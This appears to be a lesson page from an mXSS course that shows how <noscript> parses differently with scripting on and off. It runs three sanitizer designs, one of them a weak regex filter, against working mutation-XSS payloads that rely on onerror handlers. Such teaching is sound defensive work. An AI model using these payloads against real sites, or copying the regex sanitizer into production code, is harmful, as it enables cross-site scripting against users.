@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Module 4 — proof: the scripting flag, two trees</title>
+<link rel="stylesheet" href="../../assets/style.css">
+</head>
+<body>
+<div class="sheet">
+<header class="masthead">
+  <p class="eyebrow">bob_mXSS · Module 4 · proof.html · run in a real browser</p>
+  <h1>&lt;noscript&gt;<em>two trees, one string</em></h1>
+  <p class="thesis">First: the same string parsed with the flag off (<code>DOMParser</code>)
+  and on (<code>div.innerHTML</code>) &mdash; different element counts. Then: three sanitizer
+  shapes. On a current browser the classic vector is <span class="no">blocked</span>; the
+  <em>string filter</em> and the <em>allow-<code>&lt;noscript&gt;</code></em> shapes are the
+  residual risk.</p>
+</header>
+<section class="mod">
+  <div class="modhead"><span class="modnum">▶</span><h2>Part 1 — two trees</h2></div>
+  <div id="trees" class="tblwrap"></div>
+</section>
+<section class="mod">
+  <div class="modhead"><span class="modnum">▶</span><h2>Part 2 — through three sanitizers</h2></div>
+  <div id="out" class="tblwrap"></div>
+  <p id="log" class="thesis"></p>
+</section>
+<script>
+const fired = new Set(); window.__q = t => fired.add(t);
+
+// Part 1
+const S = '<noscript><img src=x onerror=1></noscript>';
+const off = new DOMParser().parseFromString(S, 'text/html');
+const onDiv = document.createElement('div'); onDiv.innerHTML = S;
+document.getElementById('trees').innerHTML =
+  '<table><thead><tr><th>scripting flag</th><th>noscript children</th><th>tree</th></tr></thead><tbody>' +
+  `<tr><td>OFF (DOMParser)</td><td>${[...off.querySelector('noscript').childNodes].map(n=>n.nodeName).join(', ')}</td><td><code>${off.querySelector('noscript').innerHTML.replace(/</g,'&lt;')}</code></td></tr>` +
+  `<tr><td>ON (div.innerHTML)</td><td>${[...onDiv.querySelector('noscript').childNodes].map(n=>n.nodeName).join(', ')}</td><td><code>${onDiv.querySelector('noscript').innerHTML.replace(/</g,'&lt;')}</code></td></tr>` +
+  '</tbody></table>';
+
+// Part 2
+function treeSanitize(html, {allowNoscript=false} = {}) {
+  const allow = new Set(['A','B','I','P','BR','SPAN','DIV','IMG','LABEL','FORM','UL','LI', ...(allowNoscript ? ['NOSCRIPT'] : [])]);
+  const d = new DOMParser().parseFromString(html, 'text/html');   // scripting OFF
+  (function walk(node){ for (const c of [...node.childNodes]) {
+    if (c.nodeType === 8) { c.remove(); continue; }
+    if (c.nodeType !== 1) continue;
+    if (c.namespaceURI !== 'http://www.w3.org/1999/xhtml' || !allow.has(c.tagName)) { walk(c); c.replaceWith(...c.childNodes); continue; }
+    for (const a of [...c.attributes]) if (/^on/i.test(a.name)) c.removeAttribute(a.name);
+    walk(c);
+  }})(d.body);
+  return d.body.innerHTML;
+}
+function regexSanitize(html) { return html.replace(/\son\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, ''); }
+
+const cases = [
+  ['tree, forbid <noscript>',  h => treeSanitize(h),                     '<noscript><p title="</noscript><img src=x onerror=__q(\'a\')>"></p></noscript>'],
+  ['tree, ALLOW <noscript>',   h => treeSanitize(h, {allowNoscript:true}),'<noscript><style></noscript><img src=x onerror=__q(\'b\')></style></noscript>'],
+  ['regex filter',             h => regexSanitize(h),                     '<noscript><img/onerror=__q(\'c\')//src=x></noscript>'],
+];
+const results = [];
+for (const [name, fn, payload] of cases) {
+  const cleaned = fn(payload);
+  const host = document.createElement('div'); host.style.display = 'none'; document.body.appendChild(host);
+  host.innerHTML = cleaned;
+  results.push({ name, cleaned });
+}
+setTimeout(() => {
+  let html = '<table><thead><tr><th>sanitizer shape</th><th>fired?</th><th>cleaned output</th></tr></thead><tbody>';
+  for (const r of results) {
+    const key = r.name.includes('forbid') ? 'a' : r.name.includes('ALLOW') ? 'b' : 'c';
+    html += `<tr><td>${r.name}</td><td>${fired.has(key) ? '<span class="yes">FIRED</span>' : '<span class="no">no</span>'}</td><td><code>${r.cleaned.replace(/</g,'&lt;').slice(0,80)}</code></td></tr>`;
+  }
+  html += '</tbody></table>';
+  document.getElementById('out').innerHTML = html;
+  document.getElementById('log').textContent = 'Fired: ' + JSON.stringify([...fired]) +
+    '. Expected on Chrome 148: "forbid" blocked; "regex" fires; "ALLOW <noscript>" may fire depending on the exact structure — the lesson is that allow-listing <noscript> re-opens the flag mismatch.';
+}, 400);
+</script>
+</div>
+</body>
+</html>
